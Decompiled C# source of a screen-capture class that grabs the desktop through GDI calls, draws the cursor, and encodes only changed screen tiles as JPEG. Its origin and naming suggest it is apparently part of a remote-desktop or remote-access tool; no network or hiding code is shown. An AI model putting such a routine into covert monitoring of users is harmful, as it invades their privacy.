using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace sc2
{
	// Token: 0x02000003 RID: 3
	public class capture
	{
		// Token: 0x06000011 RID: 17 RVA: 0x00002B3C File Offset: 0x00000D3C
		public capture(Size size)
		{
			capture.sz = size;
			capture.lastsize = Size.Empty;
		}

		// Token: 0x06000012 RID: 18
		[DllImport("gdi32.dll")]
		public static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

		// Token: 0x06000013 RID: 19
		[DllImport("gdi32.dll")]
		private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);

		// Token: 0x06000014 RID: 20
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hwnd);

		// Token: 0x06000015 RID: 21
		[DllImport("gdi32.dll", SetLastError = true)]
		private static extern IntPtr CreateCompatibleDC(IntPtr hRefDC);

		// Token: 0x06000016 RID: 22
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

		// Token: 0x06000017 RID: 23
		[DllImport("Gdi32.dll")]
		public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

		// Token: 0x06000018 RID: 24
		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool DeleteObject(IntPtr hObject);

		// Token: 0x06000019 RID: 25
		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool DeleteDC(IntPtr hdc);

		// Token: 0x0600001A RID: 26
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x0600001B RID: 27 RVA: 0x00002B54 File Offset: 0x00000D54
		public static Size screensize()
		{
			return Screen.PrimaryScreen.Bounds.Size;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002B74 File Offset: 0x00000D74
		public static Size getsize(Size size)
		{
			return capture.sz;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002B88 File Offset: 0x00000D88
		public static ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			int num2 = imageEncoders.Length;
			checked
			{
				for (int i = num; i <= num2; i++)
				{
					if (Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0)
					{
						return imageEncoders[i];
					}
				}
				return null;
			}
		}

		// Token: 0x0600001E RID: 30
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int memcmp(IntPtr p1, IntPtr p2, int count);

		// Token: 0x0600001F RID: 31 RVA: 0x00002BC4 File Offset: 0x00000DC4
		public static void init(Size size)
		{
			checked
			{
				if (size != capture.lastsize)
				{
					capture.lastbt = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppPArgb);
					capture.rg.Clear();
					capture.lastsize = size;
					capture.hdc = (IntPtr)0;
					capture.hmemdc = (IntPtr)0;
					capture.hbitmap = (IntPtr)0;
					int num = 0;
					int num2 = capture.co - 1;
					for (int i = num; i <= num2; i++)
					{
						int num3 = 0;
						int num4 = capture.co2 - 1;
						for (int j = num3; j <= num4; j++)
						{
							Rectangle rectangle = new Rectangle((int)Math.Round(unchecked((double)i * ((double)size.Width / (double)capture.co))), (int)Math.Round(unchecked((double)j * ((double)size.Height / (double)capture.co2))), (int)Math.Round((double)size.Width / (double)capture.co), (int)Math.Round((double)size.Height / (double)capture.co2));
							capture.rg.Add(rectangle);
						}
					}
				}
			}
		}

		// Token: 0x06000020 RID: 32
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "memset")]
		public static extern IntPtr MemSet(IntPtr dest, int c, int count);

		// Token: 0x06000021 RID: 33
		[DllImport("gdi32.dll")]
		private static extern bool SetStretchBltMode(IntPtr hdc, int iStretchMode);

		// Token: 0x06000022 RID: 34 RVA: 0x00002CCC File Offset: 0x00000ECC
		public static byte[] Capture()
		{
			checked
			{
				byte[] array3;
				try
				{
					capture.init(capture.getsize(capture.screensize()));
					capture.hdc = capture.GetDC((IntPtr)0);
					capture.hmemdc = capture.CreateCompatibleDC(capture.hdc);
					IntPtr intPtr = IntPtr.Zero;
					if (capture.hbitmap == intPtr)
					{
						capture.hbitmap = capture.CreateCompatibleBitmap(capture.hdc, capture.getsize(capture.screensize()).Width, capture.getsize(capture.screensize()).Height);
					}
					IntPtr intPtr2 = capture.SelectObject(capture.hmemdc, capture.hbitmap);
					capture.SetStretchBltMode(capture.hmemdc, 4);
					IntPtr intPtr3 = capture.hmemdc;
					int num = 0;
					int num2 = 0;
					Size size = capture.getsize(capture.screensize());
					capture.StretchBlt(intPtr3, num, num2, size.Width, capture.getsize(capture.screensize()).Height, capture.hdc, 0, 0, capture.screensize().Width, capture.screensize().Height, 13369376U);
					capture.SelectObject(capture.hmemdc, intPtr2);
					capture.DeleteDC(capture.hmemdc);
					capture.ReleaseDC((IntPtr)0, capture.hdc);
					Bitmap bitmap = Image.FromHbitmap(capture.hbitmap);
					Point position = Cursor.Position;
					position.X = (int)Math.Round(unchecked((double)position.X * ((double)bitmap.Width / (double)capture.screensize().Width)));
					position.Y = (int)Math.Round(unchecked((double)position.Y * ((double)bitmap.Height / (double)capture.screensize().Height)));
					Bitmap bitmap2 = new Bitmap(32, 32);
					Graphics graphics = Graphics.FromImage(bitmap2);
					Cursor @default = Cursors.Default;
					Graphics graphics2 = graphics;
					Rectangle rectangle = new Rectangle(Point.Empty, bitmap2.Size);
					@default.Draw(graphics2, rectangle);
					graphics.Dispose();
					graphics = Graphics.FromImage(bitmap);
					Graphics graphics3 = graphics;
					Image image = bitmap2;
					Point point = position;
					size = new Size((int)Math.Round(unchecked(32.0 * ((double)capture.sz.Width / (double)capture.screensize().Width))), (int)Math.Round(unchecked(32.0 * ((double)capture.sz.Height / (double)capture.screensize().Height))));
					rectangle = new Rectangle(point, size);
					graphics3.DrawImage(image, rectangle);
					graphics.Dispose();
					PixelFormat pixelFormat = PixelFormat.Format32bppArgb;
					int width = capture.rg[0].Width;
					rectangle = capture.rg[0];
					Bitmap bitmap3 = new Bitmap(width, rectangle.Height * capture.rg.Count, bitmap.PixelFormat);
					string[] array = new string[5];
					array[0] = Conversions.ToString(bitmap.Width);
					array[1] = ",";
					array[2] = Conversions.ToString(bitmap.Height);
					array[3] = "-";
					string[] array2 = array;
					int num3 = 4;
					Rectangle rectangle2 = capture.rg[0];
					array2[num3] = Conversions.ToString(rectangle2.Height);
					string text = string.Concat(array);
					int num4 = 0;
					int num5 = 0;
					int num6 = capture.rg.Count - 1;
					for (int i = num5; i <= num6; i++)
					{
						Rectangle rectangle3 = capture.rg[i];
						BitmapData bitmapData = bitmap.LockBits(rectangle3, ImageLockMode.ReadOnly, pixelFormat);
						BitmapData bitmapData2 = capture.lastbt.LockBits(rectangle3, ImageLockMode.ReadOnly, pixelFormat);
						int num7 = Math.Abs(bitmapData.Stride) * bitmapData.Height;
						if (capture.memcmp(bitmapData.Scan0, bitmapData2.Scan0, num7) != 0)
						{
							Bitmap bitmap4 = bitmap3;
							rectangle2 = new Rectangle(0, rectangle3.Height * num4, rectangle3.Width, rectangle3.Height);
							BitmapData bitmapData3 = bitmap4.LockBits(rectangle2, ImageLockMode.WriteOnly, pixelFormat);
							capture.memcpy(bitmapData3.Scan0, bitmapData.Scan0, num7);
							bitmap3.UnlockBits(bitmapData3);
							text = string.Concat(new string[]
							{
								text,
								"-",
								Conversions.ToString(rectangle3.X),
								",",
								Conversions.ToString(rectangle3.Y)
							});
							num4++;
						}
						bitmap.UnlockBits(bitmapData);
						capture.lastbt.UnlockBits(bitmapData2);
					}
					if (num4 == 0)
					{
						array3 = null;
					}
					else
					{
						capture.lastbt = bitmap;
						Bitmap bitmap5 = bitmap3;
						Rectangle rectangle4 = new Rectangle(0, 0, capture.rg[0].Width, capture.rg[0].Height * num4);
						bitmap = bitmap5.Clone(rectangle4, bitmap3.PixelFormat);
						text += A.Y;
						MemoryStream memoryStream = new MemoryStream();
						MemoryStream memoryStream2 = new MemoryStream();
						EncoderParameters encoderParameters = new EncoderParameters(1);
						encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
						bitmap.Save(memoryStream, capture.GetEncoderInfo("image/jpeg"), encoderParameters);
						byte[] array4 = A.SB(ref text);
						memoryStream2.Write(array4, 0, array4.Length);
						memoryStream2.Write(memoryStream.ToArray(), 0, (int)memoryStream.Length);
						array3 = memoryStream2.ToArray();
					}
				}
				catch (Exception ex)
				{
					capture.lastsize = Size.Empty;
					array3 = null;
				}
				return array3;
			}
		}

		// Token: 0x06000023 RID: 35
		[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
		public static extern IntPtr memcpy(IntPtr dest, IntPtr src, int count);

		// Token: 0x0400000A RID: 10
		private static Size sz;

		// Token: 0x0400000B RID: 11
		private static IntPtr hdc = (IntPtr)0;

		// Token: 0x0400000C RID: 12
		private static IntPtr hmemdc = (IntPtr)0;

		// Token: 0x0400000D RID: 13
		private static IntPtr hbitmap = (IntPtr)0;

		// Token: 0x0400000E RID: 14
		private static List<Rectangle> rg = new List<Rectangle>();

		// Token: 0x0400000F RID: 15
		private static Bitmap lastbt;

		// Token: 0x04000010 RID: 16
		private static Size lastsize = Size.Empty;

		// Token: 0x04000011 RID: 17
		private static int co = 10;

		// Token: 0x04000012 RID: 18
		private static int co2 = 10;
	}
}
